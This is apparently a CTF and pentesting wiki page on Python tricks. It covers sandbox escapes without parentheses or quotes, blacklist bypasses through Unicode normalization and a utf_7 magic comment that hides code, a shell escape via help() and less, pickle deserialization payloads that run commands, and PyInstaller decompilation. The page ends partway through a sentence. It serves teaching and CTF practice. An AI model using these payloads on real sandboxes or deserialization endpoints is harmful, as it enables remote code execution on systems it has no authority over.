---
description: Some tricks specific to the Python language
---

# Python

## Filter Bypass

If you find yourself in some sandbox, jail, or otherwise restricted environment there are a lot of tricks to get out of it.&#x20;

### RCE without parentheses

Using decorators and defined lambda functions, you can execute any code without using `(` or `)` characters. Simply the act of defining this class will execute that code in the string:

```python
code = lambda x: "import os; os.system\x28'id'\x29"

@print
@exec
@code
class a:
    pass
```

Past Python 3.9, you can even get the same code as short as this:

```python
@eval
@'__import__\x28"os"\x29.system\x28"id"\x29'.format
class _:pass
```

{% hint style="info" %}
**Note**: In the string, you can encode any other characters it doesn't accept by using `\x` hex escapes
{% endhint %}

And another completely different way using method overriding, which can even be put on a single line:

```python
exit.__class__.__add__ = exec; exit + "import os; os.system\x28'id'\x29"
```

The above method works because we overwrite the regular addition operator for the `exec()` function object. In most built-in functions, this is not allowed and you will get a `can't set attributes of built-in/extension` error. But not all built-in functions are protected like this, and a few classes exist that still allow you to overwrite their methods. You can find them all with this snippet:

<pre class="language-python"><code class="lang-python">for key, value in __builtins__.__dict__.items():
    try:
<strong>        value.__class__.__add__ = exec
</strong><strong>        print(key, value.__class__)
</strong>    except TypeError:
        pass
</code></pre>

It will print all the possible functions that allow method overriding:

<pre class="language-python"><code class="lang-python">__spec__  &#x3C;class '_frozen_importlib.ModuleSpec'>
quit      &#x3C;class '_sitebuiltins.Quitter'>
<strong>exit      &#x3C;class '_sitebuiltins.Quitter'>
</strong>copyright &#x3C;class '_sitebuiltins._Printer'>
credits   &#x3C;class '_sitebuiltins._Printer'>
license   &#x3C;class '_sitebuiltins._Printer'>
help      &#x3C;class '_sitebuiltins._Helper'>
</code></pre>

### Strings without `"` quotes

You can create arbitrary strings without using a `"` or `'` character by using the `chr()` function which takes an ASCII number:

<pre class="language-python"><code class="lang-python"><strong>>>> chr(72)+chr(101)+chr(108)+chr(108)+chr(111)+chr(44)+chr(32)+chr(119)+chr(111)+chr(114)+chr(108)+chr(100)+chr(33)
</strong>'Hello, world!'
</code></pre>

You can generate this code by converting every character to decimal:

<pre class="language-python"><code class="lang-python">string = "Hello, world!"

<strong>print("+".join(f"chr({ord(c)})" for c in string))
</strong># chr(72)+chr(101)+chr(108)+chr(108)+chr(111)+chr(44)+chr(32)+chr(119)+chr(111)+chr(114)+chr(108)+chr(100)+chr(33)
</code></pre>

#### Strings without `"` quotes or `()` parentheses

A more complicated way can be used to get strings without quotes or parentheses, using built-in strings and indexing those at specific offsets to be combined into your target string. Not all printable characters can be made in this way, but most of them can (all except `'\x0c', '\t', '#', '\x0b', '\r', '?'`). \
The most useful string attributes here are `.__doc__` and `.name`, for example, `quit.name[1]` would give you `'u'`. Using a script all of these can be found, but keep in mind that the strings might differ per Python version or context.&#x20;

<details>

<summary>Precomputed dictionary (Python 3.8.10)</summary>

```python
{
    'a': 'chr.__doc__[7]', 
    'b': 'dir.__doc__[6]', 
    'c': 'dir.__doc__[9]', 
    'd': 'dir.__doc__[0]', 
    'e': 'exit.eof[10]', 
    'f': 'id.__doc__[21]', 
    'g': 'id.__doc__[43]', 
    'h': 'id.__doc__[8]', 
    'i': 'exit.eof[8]', 
    'j': 'dir.__doc__[7]', 
    'k': 'map.__doc__[40]', 
    'l': 'exit.eof[3]', 
    'm': 'id.__doc__[68]', 
    'n': 'id.__doc__[5]', 
    'o': 'dir.__doc__[5]', 
    'p': 'map.__doc__[2]', 
    'q': 'quit.name[0]', 
    'r': 'exit.eof[2]', 
    's': 'id.__doc__[38]', 
    't': 'exit.eof[1]', 
    'u': 'quit.name[1]', 
    'v': 'pow.__doc__[4]', 
    'w': 'chr.__doc__[41]', 
    'x': 'exit.name[1]', 
    'y': 'id.__doc__[18]', 
    'z': 'zip.__doc__[0]', 
    'A': 'zip.__doc__[20]', 
    'B': 'list.__doc__[0]', 
    'C': 'exit.eof[0]', 
    'D': 'exit.eof[5]', 
    'E': 'exit.eof[13]', 
    'F': 'exit.eof[15]', 
    'G': 'iter.__doc__[65]', 
    'H': 'bytes.hex.__doc__[148]', 
    'I': 'all.__doc__[66]', 
    'J': 'classmethod.__doc__[600]', 
    'K': 'set.pop.__doc__[51]', 
    'L': 'open.__doc__[3126]', 
    'M': 'map.__doc__[38]', 
    'N': 'filter.__doc__[19]', 
    'O': 'exit.eof[14]', 
    'P': 'id.__doc__[108]', 
    'Q': 'exit.__dir__.__qualname__[0]', 
    'R': 'id.__doc__[0]', 
    'S': 'pow.__doc__[78]', 
    'T': 'all.__doc__[7]', 
    'U': 'chr.__doc__[9]', 
    'V': 'int.__doc__[477]', 
    'W': 'max.__doc__[99]', 
    'X': 'BlockingIOError.errno.__doc__[4]', 
    'Y': 'float.__getformat__.__doc__[0]',
    'Z': 'input.__doc__[230]', 
    '0': 'bin.__doc__[65]', 
    '1': 'bin.__doc__[75]', 
    '2': 'bin.__doc__[60]', 
    '3': 'hex.__doc__[71]', 
    '4': 'hex.__doc__[68]', 
    '5': 'oct.__doc__[77]', 
    '6': 'bin.__doc__[63]', 
    '7': 'bin.__doc__[61]', 
    '8': 'hex.__doc__[69]', 
    '9': 'bin.__doc__[62]', 
    ' ': 'exit.eof[6]', 
    "'": 'bin.__doc__[72]', 
    '"': 'open.__doc__[3084]', 
    '!': 'range.__doc__[263]', 
    '$': 'abs.__text_signature__[1]', 
    '%': 'pow.__doc__[54]', 
    '&': 'set.__iand__.__doc__[11]', 
    '(': 'exit.eof[7]', 
    ')': 'exit.eof[16]', 
    '*': 'zip.__doc__[4]', 
    '+': 'int.__doc__[407]', 
    ',': 'map.__doc__[8]', 
    '-': 'exit.eof[4]', 
    '.': 'exit.eof[9]', 
    '/': 'open.__doc__[326]', 
    ':': 'sum.__doc__[42]', 
    ';': 'chr.__doc__[55]', 
    '<': 'chr.__doc__[59]', 
    '=': 'chr.__doc__[60]', 
    '>': 'set.__doc__[7]', 
    '@': 'super.__doc__[402]', 
    '[': 'dir.__doc__[4]', 
    '\\': 'print.__doc__[32]', 
    '\n': 'id.__doc__[33]', 
    ']': 'int.__doc__[6]', 
    '^': 'set.__ixor__.__doc__[11]', 
    '_': 'dir.__doc__[279]', 
    '`': 'open.__doc__[1908]', 
    '{': 'dict.__doc__[186]', 
    '|': 'False.__or__.__doc__[11]', 
    '}': 'dict.__doc__[187]', 
    '~': 'False.__invert__.__doc__[0]', 
}
```

</details>

<details>

<summary>Python Source Code for Searching</summary>

This piece of code I made will recursively go through all the properties in `__builtins__` using a Breadth First Search algorithm. It tries to find the shortest possible chain of attributes to get the desired letter while skipping entries it has already seen.

You can run it in a similar environment to your target.

```python
import string


def check_methods(needed_letters, obj, attrs):
    checked = []
    best = {}
    queue = [(getattr(obj, attr), [attr]) for attr in attrs]

    # Breadth First Search
    while queue:
        obj, path = queue.pop(0)

        for key in dir(obj):
            try:
                value = getattr(obj, key)
            except AttributeError:
                continue  # Some attributes are false positives for some reason

            unique = repr(value).split('at 0x')[0]  # Remove memory address (will be different while being the same object)

            if unique in checked:
                continue  # Skip the same object

            new_path = path + [key]
            if isinstance(value, str):
                # Check if it has any of the needed letters
                for letter in needed_letters:
                    try:
                        index = value.index(letter)
                        code = f"{'.'.join(new_path)}[{index}]"

                        if letter not in best or len(code) < len(best[letter]):
                            best[letter] = code
                            print(f"{letter!r}: {code}")

                    except ValueError:
                        pass  # Letter not found

            checked.append(unique)
            queue.append((value, new_path))  # Explore child attributes

    return best


goal = 'import os; os.system("id")'
# goal = string.printable

# Remove false positive (__doc__ != __builtins__.__doc__)
objs = filter(lambda o: not o in ["__doc__"], dir(__builtins__))

needed_letters = set(string.printable)
best = check_methods(set(goal), __builtins__, objs)
print()
print(best)

# Check if entire goal is achievable
assert set(best.keys()) == set(goal), set(goal) - set(best.keys())

result = "+".join(best[l] for l in goal)
print()
print(result)
```

As an example, my Python 3.8.10 creates the following payload:

{% code title="import os; os.system("id")" overflow="wrap" %}
```python
exit.eof[8]+id.__doc__[68]+map.__doc__[2]+dir.__doc__[5]+exit.eof[2]+exit.eof[1]+exit.eof[6]+dir.__doc__[5]+id.__doc__[38]+chr.__doc__[55]+exit.eof[6]+dir.__doc__[5]+id.__doc__[38]+exit.eof[9]+id.__doc__[38]+id.__doc__[18]+id.__doc__[38]+exit.eof[1]+exit.eof[10]+id.__doc__[68]+exit.eof[7]+open.__doc__[3084]+exit.eof[8]+dir.__doc__[0]+open.__doc__[3084]+exit.eof[16]
```
{% endcode %}

</details>

### Blacklist Bypass

Some tricks to bypass specific dangerous-sounding words being blacklisted.&#x20;

#### Minimal file read using `license()`

If you can set the `._Printer__filenames` attribute to the built-in `license()` function you can change the function where it gets the license text data from. When you then afterward call the `license()` function it will use the overwritten files instead and print the data to STDOUT.&#x20;

<pre class="language-python"><code class="lang-python"><strong>>>> license._Printer__filenames=["flag.txt"]
</strong><strong>>>> license()
</strong>CTF{...}

<strong>>>> l=license;l._Printer__filenames=["flag.txt"];l()  # 48 bytes
</strong>CTF{...}
</code></pre>

#### Dictionary access bypassing string

If the "system" keyword is blacklisted for example, but you still want to execute the function for shell commands, you can try to access it using a string like `"sys"+"tem"` which technically doesn't include "system" when checking the input. But while executing these get combined into the required string.&#x20;

To access a function in this way, you cannot directly index it on the `os` module. For these dictionary accesses, you need to access a real dictionary, not a module object. Luckily, there are methods on modules that give such a dictionary interface, like `.__dict__`. If this is also blacklisted, there may be other creative ways of accessing the same function again.&#x20;

<pre class="language-python"><code class="lang-python"># Imagine you already can access the `os` module
>>> __import__("os")
&#x3C;module 'os' from '/usr/lib/python3.8/os.py'>
# Use __dict__ to get a simple dictionary of its attributes
<strong>>>> __import__("os").__dict__["system"]
</strong>&#x3C;built-in function system>
# Alternatively use any existing function, and walk back with __globals__
<strong>>>> os.walk.__globals__["system"]
</strong></code></pre>

<details>

<summary>Brute-Force script for attribute accessing (BFS)</summary>

This is often a bit of guesswork of trying to access various special attributes to end up where you want. To ease in the creation of these types of chains I made a small script to brute-force all attributes from a root node until the target is reached.&#x20;

<pre class="language-python"><code class="lang-python">import traceback  # Imagine target script already has this gadget imported
import os

BLACKLIST = ['builtins', 'dir', 'local', 'dict', 'attr', 'eval', 'exec', 'import', 'open', 'os', 'read', 'system', 'write']


def path_string(root, path):
    result = root
    for key, is_dict in path:
        result += f'["{key}"]' if is_dict else f'.{key}'

    return result


# First argument will be eval'ed as root, second argument is target to reach
def search(root, target):
    checked = []
    queue = [(eval(root), [])]

    # Breadth First Search (BFS)
    while queue:
        obj, path = queue.pop(0)

        if type(obj) == str:  # Skip strings (useless, and a bit faster)
            continue
        elif type(obj) == dict:
            objs = obj.keys()
        else:
            objs = dir(obj)

        for key in objs:
            try:
                is_dict = any(banned in key for banned in BLACKLIST)

                value = obj[key] if is_dict else getattr(obj, key)
            except (TypeError, AttributeError, KeyError):
                continue

            unique = repr(value).split('at 0x')[0]  # Remove memory address (will be different while being the same object)

            if unique in checked:
                continue  # Skip the same object (delete to find all paths, but is really slow)

            new_path = path + [(key, is_dict)]

            if value == target:
                return path_string(root, new_path)

            checked.append(unique)
            queue.append((value, new_path))  # Explore child attributes


# Try to find a path to os.system from the traceback module
<strong>print(search("traceback", os.system))  # traceback.sys.modules["os"]._exists.__globals__["system"]
</strong># ^^ these strings can then easily be escaped like "o"+"s" and "sys"+"tem" to bypass
</code></pre>

</details>

#### Unicode Bypass

Python normalizes Unicode characters for names, so they can be used if the check does not do this normalization. You can use Unicode characters to replace names that would normally be blocked. For example, the following payload does not contain the string "open" or "read":

```python
𝘰𝘱𝘦𝘯("flag").𝘳𝘦𝘢𝘥()
```

Instead, it uses the 'Mathematical Sans-Serif Italic' (U+1D608...) characters which will normalize to ASCII letters when Python is executed (notice the slanted characters). You can create arbitrary payloads with a script like the following:

```python
BLACKLIST = ["open", "read"]

def to_unicode(s):
    alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
    return ''.join([chr(alphabet.index(c) + 0x1D608) if c in alphabet else c for c in s])

def obfuscate(payload):
    for word in BLACKLIST:
        payload = payload.replace(word, to_unicode(word))

    return payload

print(obfuscate('open("flag").read()'))  # 𝘰𝘱𝘦𝘯("flag").𝘳𝘦𝘢𝘥()
```

{% hint style="success" %}
If a **shorter** payload (fewer bytes) is needed, you can mix and match these Unicode characters in your payload. These Unicode characters take up 4 bytes each, but you will likely **only need one** in your blacklisted word to bypass it, requiring the penalty once. For example, with only the first character encoded:

```python
𝘰pen("flag").𝘳ead()
```
{% endhint %}

{% hint style="info" %}
See [this site](https://gosecure.github.io/unicode-pentester-cheatsheet/) for a table of all Unicode transformations, as this trick is far from the only one. Look for "Normalization NFKC" as Python uses it for resolving function names
{% endhint %}

#### AST Bypass using magic comment

When your payload is stored as a file and run, instead of just being evaluated, it is interpreted as a _module_. This small difference adds a possible trick using [**magic comments**](https://docs.python.org/3/reference/lexical\_analysis.html#encoding-declarations) that define an encoding for the rest of the file. A [list of languages can be found here](https://docs.python.org/3/library/codecs.html#standard-encodings), which includes odd ones like `unicode_escape`, `unicode_escape_raw` or `utf_7`. ([read writeup](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy))

These can be abused in an AST scenario because comments are ignored while parsing, and it assumes UTF-8. With this, we can add a hidden newline after a comment to insert more code, while in UTF-8 this newline will be seen as part of the comment and is ignored while parsing the AST.&#x20;

Take the following example:

{% code title="Payload" %}
```python
# coding: utf_7
def f(x):
    return x
    #+AAo-__import__("os").system("id")
```
{% endcode %}

This executes the `id` shell command when run, while it looks like it only defines a function:

{% code title="AST Representation" %}
```python
Module(
    body=[
        FunctionDef(
            name='f',
            args=arguments(
                posonlyargs=[],
                args=[
                    arg(arg='x')],
                kwonlyargs=[],
                kw_defaults=[],
                defaults=[]),
            body=[
                Return(
                    value=Name(id='x', ctx=Load()))],
            decorator_list=[])],
    type_ignores=[])
```
{% endcode %}

### Overwriting variables

Sometimes you can abuse the environment that is sandboxing/evaluating your input, by altering it with your code. If there is a `blocked` list for example, you may be able to overwrite it with an empty array to disable the filter in your next attempt. You can get creative with whatever variables you can alter to get an exploitable effect.

When it is possible to overwrite a _function_ that will be called, a simple way out is to call the `help()` function. This provides an interactive shell where you can get help pages about Python objects. When the content is sufficiently large, you will be put into a `less` editor where you can scroll around, but more importantly, [escape](https://gtfobins.github.io/gtfobins/less/#shell)!

<pre class="language-python"><code class="lang-python"><strong>>>> help()
</strong><strong>help> str
</strong>Help on class str in module builtins:

class str(object)
 |  str(object='') -> str
 |  str(bytes_or_buffer[, encoding[, errors]]) -> str
 |
...
<strong>:!/bin/sh
</strong>$ id
uid=1001(user) gid=1001(user) groups=1001(user)
</code></pre>

Note that it gives an error when you provide a string that is not a Python object like `help("anything")` instead of `help("str")`.

```python
# Works
>>> help("str")      # gives "str" documentation
>>> help(1)          # interpreted as "int"
# Doesn't work
>>> help("anything") # Error: "anything" not recognized
>>> help(1, 2)       # Error: too many arguments
```

## PyInstaller Reversing

[PyInstaller](https://pyinstaller.org/en/stable/) can create executable and shareable files from Python scripts, like Windows `.exe` files or Linux ELF files. It can also be used for malware where an attacker creates a malicious Python script and compiles it to an executable they can plant somewhere with PyInstaller. That is why Reversing such a file can be very useful, and it turns out the full source code can almost flawlessly be decompiled from such a file.&#x20;

First, you will want to extract the data from the PyInstaller executable. This can be done very easily using pyinstxtractor.&#x20;

{% embed url="https://github.com/extremecoders-re/pyinstxtractor" %}
A tool to extract contents of a PyInstaller executable
{% endembed %}

As the above repository shows in the [example](https://github.com/extremecoders-re/pyinstxtractor#example), the script generates a `[name]_extracted` folder with `.pyc` files. Among these files will be all the modules, and the main script. You will often have to guess what file is the main script, but the tool will also give "Possible entry points".&#x20;

These `.pyc` files are the compiled Python bytecode, which is not human-readable. For that, we can use [uncompyle6](https://github.com/rocky/python-uncompyle6/) or [pycdc](https://github.com/zrax/pycdc) to decompile this bytecode into close to the original source code.&#x20;

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ python3 pyinstxtractor.py example.exe
</strong>[+] Processing dist/example.exe
[+] Pyinstaller version: 2.1+
[+] Python version: 36
[+] Length of package: 5612452 bytes
[+] Found 59 files in CArchive
[+] Beginning extraction...please standby
[+] Possible entry point: example.pyc
[+] Found 133 files in PYZ archive
[+] Successfully extracted pyinstaller archive: dist/example.exe

<strong>$ uncompyle6 example.exe_extracted/example.pyc > example.py  # .pyc name might differ
</strong>
<strong>$ pycdc example.exe_extracted/example.pyc > example.py  # For newer Python versions
</strong></code></pre>

Then you can look at the created `.py` file to review all the source code.&#x20;

### Dynamic: Library Hijacking

This idea came from a combination of [this writeup](https://devilinside.me/blogs/unpacking-pyarmor) about PyArmor, and my own experiments.

If the code after decompiling still looks unreadable, it may be protected with an obfuscator or "packer". These try to make it _harder_ to deobfuscate, but with some tricks, we can perform dynamic analysis to recover the code and steps after it has been decrypted at runtime.&#x20;

You should be able to run the `example.pyc` file with `python` like you normally would, because it's simply the already-compiled version. If you get any errors involving **missing** `.so` **files**, a simple solution is to just run it with `LD_LIBRARY_PATH=.` as they should be in the \_extracted directory.

> ImportError: `libffi.so.6`: cannot open shared object file: No such file or directory

<pre class="language-shell-session"><code class="lang-shell-session">$ cd armored.exe_extracted
<strong>$ LD_LIBRARY_PATH=. python3.6 armored.pyc
</strong></code></pre>

Note the specific Python version here, as the _magic number_ might not line up with your default version. Just use `apt` to install the version and possibly `-distutils` of it too when using `pip`.

Then after this, there still might be errors involving **Python imports** which should normally be included in the binary. To get these back as `.pyc` files, they are simply located in the \
`PYZ-00.pyz_extracted` folder that was also created by `pyinstxtractor`. A simple solution is to **copy these files next to your main file**:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ cp -r PYZ-00.pyz_extracted/* .
</strong>$ LD_LIBRARY_PATH=. python3.6 armored.pyc
</code></pre>

This should get the binary running like normal, with the big change being that it is in its unpacked form, where we can see all the libraries. This allows us to **hijack libraries** by changing their code. After doing so, the mysterious main code will load our library, from which we can extract information about the calling code at runtime!\
Take any library that you know the code imports, which may be one from the `ImportError`s we got above. We will backup the original code, and replace it with our own:

{% code title="psutil.py" %}
```python
print("Hello from psutil")
```
{% endcode %}

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ mv psutil/ psutil.bak/
</strong>$ LD_LIBRARY_PATH=. python3.6 armored.pyc
Hello from psutil
</code></pre>

It works! Now for the final step, we can use the `inspect` module to view the call stack and find out what code called us. This code object can be disassembled to understand the bytecode:

<pre class="language-renpy" data-title="psutil.py"><code class="lang-renpy">import inspect

<strong>for frameinfo in inspect.stack():
</strong>    print(frameinfo)
</code></pre>

Here, choose a frame that makes sense and looks like it should be the main code. In my case, the last `[-1]` frame was the obfuscated code still, but the frame before that `[-2]` was decrypted.&#x20;

<pre class="language-renpy" data-title="psutil.py"><code class="lang-renpy">import inspect
import dis

<strong>frame = inspect.stack()[-2].frame
</strong>print(frame)

<strong>codeobject = frame.f_code
</strong>print(codeobject)

<strong>dis.dis(codeobject)  # Disassemble the bytecode in codeobject to STDOUT
</strong></code></pre>

To go one step further, we can even forge our own `.pyc` file from the codeobject, allowing decompilers like `uncompyle6` or `pycdc` to make readable source code from it:

<pre class="language-python"><code class="lang-python">import marshal

with open("extracted.pyc", "wb") as f:
<strong>    f.write(imp.get_magic())  # Correct magic number for uncompyle6
</strong>    f.write(b"\x00" * 8)
    if sys.version_info[1] >= 7:  # Extra 4 bytes in Python 3.7+
        f.write(b"\x00" * 4)

    # Write the code object
<strong>    f.write(marshal.dumps(frame.f_code))
</strong></code></pre>

```bash
uncompyle6 extracted.pyc
```

{% hint style="warning" %}
**Note**: This trick did not work in my case, as I received strage `AssertionError`s in `format_RAISE_VARARGS_older`, but it may work for you
{% endhint %}

### Decompiling `co_code` bytecode

All functions, classes, modules etc. in Python have a `__code__` attribute, which holds information about its code. This is not directly source code, but _bytecode_, being the optimized form that the interpreter sees without having to deal with different whitespace or variable names.&#x20;

Using `dis.dis()` on such an object, the disassembled bytecode is printed in a readable form. The `<class 'code'>` has several parts, one of which is the raw bytecode in `co_code`. This can also be disassembled with the same function, but it won't contain referenced variable names or constants. These are in `co_names`+`co_varnames` and `co_consts` respectively, and can be combined into the final readable code Python understands. Look at this example:

{% code title="Python 3.8" %}
```renpy
import dis

def f():  # [Mystery function]
    a = "Hello, world!"
    print(a)

print(f.__code__.co_code)    # b'd\x01}\x00t\x00|\x00\x83\x01\x01\x00d\x00S\x00'
print(f.__code__.co_names, f.__code__.co_varnames)   # ('print',) ('a',)
print(f.__code__.co_consts)  # (None, 'Hello, world!')
dis.dis(f.__code__.co_code)
#      0 LOAD_CONST               1 (1)
#      2 STORE_FAST               0 (0)
#      4 LOAD_GLOBAL              0 (0)
#      6 LOAD_FAST                0 (0)
#      8 CALL_FUNCTION            1
#     10 POP_TOP
#     12 LOAD_CONST               0 (0)
#     14 RETURN_VALUE
```
{% endcode %}

{% embed url="https://unpyc.sourceforge.net/Opcodes.html" %}
Page explaining most opcodes like `LOAD_CONST` with examples
{% endembed %}

From reading these attributes, we can recreate the code object from scratch and dump it into a `.pyc` file like before. Then tools like `uncompyle6` can decompile the bytecode back into source:

<pre class="language-renpy"><code class="lang-renpy"># Replace attributes of the code object from an empty function
<strong>code = (lambda: None).__code__.replace(
</strong><strong>    co_consts=f.__code__.co_consts,
</strong><strong>    co_code=f.__code__.co_code,
</strong><strong>    co_names=f.__code__.co_names,
</strong><strong>    co_varnames=f.__code__.co_varnames,
</strong><strong>    # ...
</strong><strong>    # Full list depends on version, see https://docs.python.org/3/c-api/code.html
</strong><strong>)
</strong>
with open("output.pyc", "wb") as f:
    f.write(imp.get_magic())  # Correct magic number for uncompyle6
    f.write(b"\x00" * 8)
    if sys.version_info[1] >= 7:  # Extra 4 bytes in Python 3.7+
        f.write(b"\x00" * 4)

    # Write the code object
    f.write(marshal.dumps(code))
</code></pre>

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ uncompyle6 output.pyc
</strong>a = 'Hello, world!'
print(a)
</code></pre>

## Pickle Deserialization

[Pickle](https://docs.python.org/3/library/pickle.html) is a Python module used for serializing Python objects into raw bytes. This way they can be sent over the network, or saved in a file, and then later be deserialized to get back the original Python object.&#x20;

However, there is one issue: when this deserialized data can come from the user, they can create arbitrary Python objects. This results in a classic Insecure Deserialization vulnerability, leading to Remote Code Execution.&#x20;

<figure><img src="../.gitbook/assets/image (1) (3).png" alt=""><figcaption><p>A warning from the official documentation explaining the danger of this module</p></figcaption></figure>

{% hint style="info" %}
_This vulnerability has a special place in my heart_, as I found it as an unintentional bug on a school assignment, and spent a lot of time and effort to try and get the most out of it. In the end, it resulted in RCE on the server, as well as on all clients that connected because the template script given was also vulnerable. You can read the whole story and learn a lot about pickle deserialization here:

{% embed url="https://jorianwoltjer.com/blog/post/hacking/getting-rce-on-a-brute-forcing-assignment" %}
Getting RCE with pickle, in **under 40 bytes** per packet, and taking over the server to also exploit clients
{% endembed %}
{% endhint %}

The basics are that you can create a Python object that executes a **system command** when pickle turns it into an object. This is done with the special `__reduce__()` method:

```python
import pickle

class RCE:
    def __reduce__(self):
        import os
        return (os.system, ("id",))

rce = RCE()
data = pickle.dumps(rce)
print(data) # b'\x80\x04\x95\x1d\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c\x02id\x94\x85\x94R\x94.'
```

This method is called when the object is deserialized, and its return value will be what it turns into. But this return value is actually a function that will be called with the arguments provided. We can provide the function `os.system` after importing it, and as the first argument give it any command we want to run.&#x20;

{% hint style="info" %}
**Tip**: Using `exec` or `eval` instead of `os.system` can allow for more control over the actions your payload takes, as you can execute arbitrary Python code at the time of deserialization. Think of things like `raise` to return a readable exception message
{% endhint %}

### Minimizing Payloads

The above is often enough, but in rare cases, you might have some restrictions on what data you can send. Maybe you need to bypass some filter or a length restriction.&#x20;

#### Different Protocols

Pickle has evolved over time, with new protocols for better serializing of objects. Luckily, this protocol can be chosen by whoever creates the data, and the server deserializing it will simply recognize the protocol and switch accordingly.&#x20;

This opens up the opportunity for a few different formats that might help in whatever filter you are trying to get through.&#x20;

Using the `pickletools.dis(data)` function, we can disassemble the serialized data to better understand what each byte is doing:

```python
    0: \x80 PROTO      4
    2: \x95 FRAME      29
   11: \x8c SHORT_BINUNICODE 'posix'
   18: \x94 MEMOIZE    (as 0)
   19: \x8c SHORT_BINUNICODE 'system'
   27: \x94 MEMOIZE    (as 1)
   28: \x93 STACK_GLOBAL
   29: \x94 MEMOIZE    (as 2)
   30: \x8c SHORT_BINUNICODE 'id'
   34: \x94 MEMOIZE    (as 3)
   35: \x85 TUPLE1
   36: \x94 MEMOIZE    (as 4)
   37: R    REDUCE
   38: \x94 MEMOIZE    (as 5)
   39: .    STOP
```

This `PROTO` value represents the protocol used, and in the `pickle.dumps` method we can simply specify `protocol=` keyword argument to specify the protocol. This is a number between 0 and 5. Looking at all of these protocols the payload can get very different:

```python
protocol=0                         protocol=1 (shortest)               protocol=2                          protocol=3                          protocol=4 (default)
 0: c  GLOBAL   'posix system'      0: c  GLOBAL   'posix system'       0: \x80 PROTO    2                  0: \x80 PROTO    3                  0: \x80 PROTO    5
14: p  PUT      0                  14: q  BINPUT   0                    2: c    GLOBAL   'posix system'     2: c    GLOBAL   'posix system'     2: \x95 FRAME    29
17: (  MARK                        16: (  MARK                         16: q    BINPUT   0                 16: q    BINPUT   0                 11: \x8c SHORT_BINUNICODE 'posix'
18: V    UNICODE  'id'             17: X    BINUNICODE 'id'            18: X    BINUNICODE 'id'            18: X    BINUNICODE 'id'            18: \x94 MEMOIZE  (as 0)
22: p    PUT      1                24: q    BINPUT     1               25: q    BINPUT  1                  25: q    BINPUT   1                 19: \x8c SHORT_BINUNICODE 'system'
25: t    TUPLE    (MARK at 17)     26: t    TUPLE      (MARK at 16)    27: \x85 TUPLE1                     27: \x85 TUPLE1                     27: \x94 MEMOIZE  (as 1)
26: p  PUT      2                  27: q  BINPUT   2                   28: q    BINPUT  2                  28: q    BINPUT   2                 28: \x93 STACK_GLOBAL
29: R  REDUCE                      29: R  REDUCE                       30: R    REDUCE                     30: R    REDUCE                     29: \x94 MEMOIZE  (as 2)
30: p  PUT      3                  30: q  BINPUT   3                   31: q    BINPUT  3                  31: q    BINPUT   3                 30: \x8c SHORT_BINUNICODE 'id'
33: .  STOP                        32: .  STOP                         33: .    STOP                       33: .    STOP                       34: \x94 MEMOIZE  (as 3)
len(data)=34                       len(data)=33                        len(data)=34                        len(data)=34                        35: \x85 TUPLE1
                                                                                                                                               36: \x94 MEMOIZE    (as 4)
                                                                                                                                               37: R    REDUCE
                                                                                                                                               38: \x94 MEMOIZE    (as 5)
                                                                                                                                               39: .    STOP
                                                                                                                                               len(data)=40
```

In most simple cases, `protocol=1` is the shortest.&#x20;

#### Replacing strings

As you might have noticed above, the `os.system` function turned into `'posix system'` for serialized data. This is what automatically happens when you serialize data using `pickle.dumps`, but it turns out there are actually multiple ways to represent this function.&#x20;

I expected to see `os` instead of `posix`, so I tried simply replacing `posix` with `os`. This turned out to actually work! The deserializer will happily decode this to the correct function and still achieves RCE. By simply replacing this text in the serialized data, you can get rid of 3 characters:

```python
rce = RCE()
data = pickle.dumps(rce)
data = data.replace(b"posix", b"os")
print(data)  # b'\x80\x04\x95\x1d\x00\x00\x00\x00\x00\x00\x00\x8c\x05os\x94\x8c\x06system\x94\x93\x94\x8c\x02id\x94\x85\x94R\x94.'
```

#### Short commands

Finally, after having the shortest possible pickle data, you need a short command to receive a shell and further explore the target. In [the writeup](https://jorianwoltjer.com/blog/post/hacking/getting-rce-on-a-brute-forcing-assignment#bash-tricks) linked above, I discovered my own method to slowly write a full payload to a file and execute it in a lot of commands below 12 bytes. This was enough to bypass the 40-byte packet limit that the situation had.&#x20;

However, in the meantime, I found that this problem has been explored before. Orange Tsai made a challenge where you had to achieve full RCE commands of only 4 bytes each. The solution to this challenge is explained in [#rce-in-4-bytes](../linux/hacking-linux-boxes.md#rce-in-4-bytes "mention"). This can be applied just as easily to this injection.&#x20;

### Bypassing Filters

[As explained in the documentation](https://docs.python.org/3/library/pickle.html#restricting-globals), a filter can be added to the deserialization process that restricts the objects that can be imported. This is normally possible through the [`GLOBAL`](https://github.com/python/cpython/blob/2ac1b48a044429d7a290310348b53a87b9f2033a/Lib/pickletools.py#L1926-L1939) opcode which takes a module and a class to load. This allows it to use methods from other modules and classes while deserializing, which is how it is able to deserialize any object.&#x20;

As we have seen above, it allows an attacker to import dangerous modules such as `os` to run commands, or builtins like `exec` and `eval` to execute arbitrary Python code. The filter can define its own logic for importing modules and classes with an extension like the following:

<pre class="language-python" data-title="Example filter"><code class="lang-python"><strong>ALLOWED_PICKLE_MODULES = ["random", "collections"]
</strong><strong>UNSAFE_PICKLE_BUILTINS = ["eval", "exec"]
</strong>
class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        if (
            # Allow anything from the 'random' or 'collections' module
<strong>            module in ALLOWED_PICKLE_MODULES
</strong>            # From 'builtins', disallow 'eval' and 'exec', allow everything else
<strong>            or module == "builtins" and name not in UNSAFE_PICKLE_BUILTINS
</strong>        ):
            return super().find_class(module, name)  # load it

        raise pickle.UnpicklingError()  # raise exception if disallowed
</code></pre>

The above rules only allow classes from the `random` module to be imported and some dangerous built-ins are blocked. While it may seem safe at first, it turns out that there are a lot of possibilities still to bypass a configuration like this. Great research into this has been done by [@splitline](https://twitter.com/\_splitline\_) who ended up creating a tool that compiles Python-like code into serialized pickle data because the opcodes are quite powerful and allow defining some simple logic ([also check out the talk](https://www.youtube.com/watch?v=BAt8M2D77TQ\&t=1440s)):

{% embed url="https://github.com/splitline/Pickora" %}
Write pickle bytecode by scripting in Python with this compiler
{% endembed %}

The most important pieces of syntax that it can turn into pickle are the following:

